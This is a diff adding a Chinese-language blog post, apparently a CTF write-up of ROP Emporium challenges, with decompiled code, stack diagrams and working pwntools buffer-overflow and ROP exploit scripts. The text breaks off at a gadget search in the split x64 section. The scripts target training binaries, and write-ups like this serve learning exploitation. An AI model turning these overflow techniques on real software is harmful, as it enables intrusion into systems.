@@ -1,0 +1,732 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/my_ico.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/my_ico.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/my_ico.ico">
+  <link rel="mask-icon" href="/images/my_ico.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="好久没做PWN相关的题目了，最近捡起PWN中ROP一系列题目ROP Emporium来做一做，发现许多缺项，就好好做个笔记记录一下吧。 ret2win x86 一道非常简单的题，一眼解，IDA打开，发现关键代如下： 123456789101112int pwnme()&amp;#123;  char s; &#x2F;&#x2F; [esp+0h] [ebp-28h]  memset(&amp;s, 0, 0x20u">
+<meta property="og:type" content="article">
+<meta property="og:title" content="rop emporium">
+<meta property="og:url" content="http://example.com/2022/09/27/rop-emporium/index.html">
+<meta property="og:site_name" content="lylanfree&#39;s blog">
+<meta property="og:description" content="好久没做PWN相关的题目了，最近捡起PWN中ROP一系列题目ROP Emporium来做一做，发现许多缺项，就好好做个笔记记录一下吧。 ret2win x86 一道非常简单的题，一眼解，IDA打开，发现关键代如下： 123456789101112int pwnme()&amp;#123;  char s; &#x2F;&#x2F; [esp+0h] [ebp-28h]  memset(&amp;s, 0, 0x20u">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-09-27T14:49:55.000Z">
+<meta property="article:modified_time" content="2022-09-29T01:16:26.877Z">
+<meta property="article:author" content="lylanfree">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="rop">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2022/09/27/rop-emporium/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>rop emporium | lylanfree's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --></head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">lylanfree's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/27/rop-emporium/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="lylanfree">
+      <meta itemprop="description" content="持续学习的程序员">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lylanfree's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          rop emporium
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2022-09-27 22:49:55" itemprop="dateCreated datePublished" datetime="2022-09-27T22:49:55+08:00">2022-09-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2022-09-29 09:16:26" itemprop="dateModified" datetime="2022-09-29T09:16:26+08:00">2022-09-29</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>11k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>10 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>好久没做PWN相关的题目了，最近捡起PWN中ROP一系列题目<a target="_blank" rel="noopener" href="https://ropemporium.com/"><code>ROP Emporium</code></a>来做一做，发现许多缺项，就好好做个笔记记录一下吧。</p>
+<h2 id="ret2win">ret2win</h2>
+<h3 id="x86">x86</h3>
+<p>一道非常简单的题，一眼解，IDA打开，发现关键代如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What could possibly go wrong?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You there, may I have your input please? And don&#x27;t worry about null bytes, we&#x27;re using read()!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x38</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<p>且代码中包含后门函数——ret2win：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ret2win</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Well done! Here&#x27;s your flag:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/cat flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>因此直接利用pwnme中read函数的写入缓冲区溢出漏洞，覆盖掉pwnme函数的返回地址，将其覆盖为ret2win的函数地址，即可获得flag，exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2win32&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * (<span class="number">0x28</span>+<span class="number">4</span>)</span><br><span class="line">payload += p32(<span class="number">0x804862c</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="x64">x64</h3>
+<p>和上题32位程序利用手法一样，使用缓冲区溢出覆盖返回地址即可，题目关键代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What could possibly go wrong?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You there, may I have your input please? And don&#x27;t worry about null bytes, we&#x27;re using read()!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x38</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>且题目中包含后门函数如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ret2win</span><span class="params">()</span>  <span class="comment">// 0x400756</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Well done! Here&#x27;s your flag:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/cat flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>exp代码如下：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2win&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * (<span class="number">0x20</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(<span class="number">0x400756</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="armv5">armv5</h3>
+<p>查看基本情况：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">file ret2win_armv5</span> </span><br><span class="line">ret2win_armv5: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=a82dade296415721f90684517d0e6259d4ba2905, not stripped</span><br></pre></td></tr></table></figure>
+<p>拖入IDA中分析，关键函数如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [sp+0h] [bp-24h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What could possibly go wrong?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You there, may I have your input please? And don&#x27;t worry about null bytes, we&#x27;re using read()!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x38</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>且代码中包含后门函数用于输出flag，其地址为0x00105EC，值得注意的是s的地址虽然与bp相差0x24个字节，但查看其汇编代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:00010570 pwnme                                   ; CODE XREF: main+30↑p</span><br><span class="line">.text:00010570</span><br><span class="line">.text:00010570 s               = -0x24</span><br><span class="line">.text:00010570</span><br><span class="line">.text:00010570                 STMFD   SP!, &#123;R11,LR&#125;   ; Store Block to Memory</span><br><span class="line">.text:00010574                 ADD     R11, SP, #4     ; Rd = Op1 + Op2</span><br><span class="line">.text:00010578                 SUB     SP, SP, #0x20   ; Rd = Op1 - Op2</span><br><span class="line">.text:0001057C                 SUB     R3, R11, #-s    ; Rd = Op1 - Op2</span><br><span class="line">.text:00010580                 MOV     R2, #0x20       ; n</span><br><span class="line">.text:00010584                 MOV     R1, #0          ; c</span><br><span class="line">.text:00010588                 MOV     R0, R3          ; s</span><br></pre></td></tr></table></figure>
+<p>第一条指令<code>STMFD   SP!, &#123;R11,LR&#125;</code>将LR寄存器（存储返回地址）和R11寄存器依次存储到栈上，此时栈空间如下：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-+-----------+-</span><br><span class="line"> +  LR       +</span><br><span class="line">-+-----------+ </span><br><span class="line"> +  R11      +</span><br><span class="line">-+-----------+-   &lt;--- SP</span><br></pre></td></tr></table></figure>
+<p>第二条指令将R11寄存器值修改为 SP+4，此时栈布局如下：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-+-----------+-</span><br><span class="line"> +  LR       +</span><br><span class="line">-+-----------+-&lt;--- R11</span><br><span class="line"> +  R11      +    0x4</span><br><span class="line">-+-----------+-&lt;--- SP</span><br></pre></td></tr></table></figure>
+<p>第三条指令将SP值修改为SP-0x20，此时栈布局如下：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-+-----------+-</span><br><span class="line"> +  LR       +</span><br><span class="line">-+-----------+-&lt;--- R11</span><br><span class="line"> +  R11      +    0x4</span><br><span class="line">-+-----------+-------</span><br><span class="line">-+           +-   </span><br><span class="line">-+           +-   0x20 </span><br><span class="line">-+           +-</span><br><span class="line">-+-----------+-&lt;--- SP</span><br></pre></td></tr></table></figure>
+<p>第四条指令将R3（数组s的地址）修改为R11-0x24 = SP ，因此数组s地址据返回地址的距离为 0x24，编写exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.bits = <span class="number">32</span></span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;qemu-arm&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/arm-linux-gnueabihf/&#x27;</span>, <span class="string">&#x27;./ret2win_armv5&#x27;</span>])</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&quot;A&quot;</span> * (<span class="number">0x24</span>)</span><br><span class="line">payload += p32(<span class="number">0x000105EC</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>由于主机为x86机器，没有arm环境，需要安装qemu等arm启动环境</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install qemu</span><br><span class="line">apt install libc6-dbg-armhf-cross</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="mips">mips</h3>
+<blockquote>
+<p><code>TODO</code></p>
+</blockquote>
+<h2 id="split">split</h2>
+<p>这道题目与上题的区别在于没有可直接利用的函数（单独覆盖返回地址），需要精心构造后门函数的参数才可以利用。</p>
+<h3 id="x86-1">x86</h3>
+<p>漏洞函数如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [esp+0h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Contriving a reason to ask user for data...&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x60</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>后门函数如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">usefulFunction</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/ls&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但是后门函数中system函数调用的是<code>/bin/ls</code>，而不是<code>/bin/sh</code>或<code>/bin/cat flag.txt</code>，无法直接利用，需要填充system函数的参数，查看所有字符串，可以看到存在字符串<code>/bin/cat flag.txt</code>：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.data:0804A030	00000012	C	/bin/cat flag.txt</span><br></pre></td></tr></table></figure>
+<p>查找到system函数地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.plt:080483E0 ; int system(const char *command)</span><br><span class="line">.plt:080483E0 _system         proc near               ; CODE XREF: usefulFunction+E↓p</span><br><span class="line">.plt:080483E0</span><br><span class="line">.plt:080483E0 command         = dword ptr  4</span><br><span class="line">.plt:080483E0</span><br><span class="line">.plt:080483E0                 jmp     ds:off_804A018</span><br><span class="line">.plt:080483E0 _system         endp</span><br></pre></td></tr></table></figure>
+<p>将<code>/bin/cat flag.txt</code>字符串地址填充到system函数的参数地址即可。构造exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./split32&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x28</span>+<span class="number">4</span>)</span><br><span class="line">payload += p32(<span class="number">0x80483E0</span>)       <span class="comment"># addr of system</span></span><br><span class="line">payload += p32(<span class="number">0</span>)               <span class="comment"># ret addr of system</span></span><br><span class="line">payload += p32(<span class="number">0x0804A030</span>)      <span class="comment"># arg of system</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="x64-1">x64</h3>
+<p>与x86类似，值得注意的是此时单个参数传递不再使用栈，而是直接利用<strong>rdi</strong>寄存器传参，因此需要将字符串地址复制到rdi寄存器中。</p>
+<p>漏洞函数和后门函数与上题类似：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Contriving a reason to ask user for data...&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">usefulFunction</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/ls&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>查看<strong>system</strong>函数地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.plt:0000000000400560 ; int system(const char *command)</span><br><span class="line">.plt:0000000000400560 _system         proc near               ; CODE XREF: usefulFunction+9↓p</span><br><span class="line">.plt:0000000000400560                 jmp     cs:off_601020</span><br><span class="line">.plt:0000000000400560 _system         endp</span><br><span class="line">.plt:0000000000400560</span><br></pre></td></tr></table></figure>
+<p>查看字符串<code>/bin/cat flag.txt</code>地址：</p>
+<blockquote>
+<p>.data:0000000000601060 00000012 C /bin/cat flag.txt</p>
+</blockquote>
+<p>为了将字符串地址写入rdi寄存器，需要构造rop，采用ROPgadget搜索相关可用指令：</p>
